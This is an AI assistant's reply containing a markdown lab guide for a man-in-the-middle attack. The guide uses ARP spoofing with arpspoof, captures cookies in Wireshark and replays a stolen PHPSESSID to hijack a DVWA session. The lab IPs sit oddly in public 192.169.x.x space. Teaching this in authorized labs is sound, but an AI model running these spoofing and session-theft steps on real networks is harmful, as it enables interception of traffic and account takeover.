Got it! Here’s the updated `mitm_attack_steps.md` with your exact IP addresses:

````markdown
# Man-in-the-Middle (MITM) Attack Steps

This document outlines the step-by-step process to perform a Man-in-the-Middle attack using ARP spoofing to hijack a session on a web application (e.g., DVWA).

---

## Prerequisites

- Three machines or VMs on the same network:
  - **Attacker (Kali Linux)** — IP: `192.169.200.3`
  - **Web Server (Ubuntu Server hosting DVWA)** — IP: `192.169.200.4`
  - **Victim (Ubuntu Client)** — IP: `192.169.200.5`
- Tools installed on Kali:
  - `arpspoof` (part of `dsniff` package)
  - `wireshark` or `tcpdump`
- All machines are reachable and pingable.

---

## Step 1: Enable IP Forwarding on Kali

To allow Kali to forward packets between Victim and Server, run:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
````

To make this permanent, edit `/etc/sysctl.conf` and set:

```
net.ipv4.ip_forward = 1
```

Then apply:

```bash
sysctl -p
```

---

## Step 2: Perform ARP Spoofing

Open two terminal windows on Kali:

* Spoof the Victim (make Kali look like Server):

```bash
arpspoof -i eth0 -t 192.169.200.5 192.169.200.4
```

* Spoof the Server (make Kali look like Victim):

```bash
arpspoof -i eth0 -t 192.169.200.4 192.169.200.5
```

*Replace `eth0` with your Kali network interface name.*

---

## Step 3: Capture HTTP Traffic

Open Wireshark on Kali, start capturing on `eth0`, and filter with:

```
http.cookie
```

This will show HTTP requests containing cookies, including session IDs.

---

## Step 4: Victim Logs into Web Application

On the Victim machine (`192.169.200.5`), open a browser and log in to the web app hosted on the Server (`192.169.200.4`), for example:

```
http://192.169.200.4/dvwa
```

---

## Step 5: Extract Session Cookie

In Wireshark, locate HTTP requests from the Victim to the Server.
Find the `Cookie` header with the `PHPSESSID` value.

---

## Step 6: Hijack the Session

On Kali or another machine, open a browser to the same web app, and replace your session cookie with the stolen `PHPSESSID` using a cookie editor extension or browser dev tools.
Refresh the page to gain access as the Victim.

---

## Important Notes

* Use this knowledge only in authorized lab environments.
* Never perform unauthorized attacks.
* Session hijacking is easier on unencrypted HTTP; HTTPS encrypts cookies.

---

## References

* [DVWA Project](http://www.dvwa.co.uk/)
* [ARP Spoofing Wikipedia](https://en.wikipedia.org/wiki/ARP_spoofing)
* [Wireshark Filters](https://wiki.wireshark.org/DisplayFilters)


If you want, I can help with the next file (`arp_spoofing_commands.md`) or anything else!
``
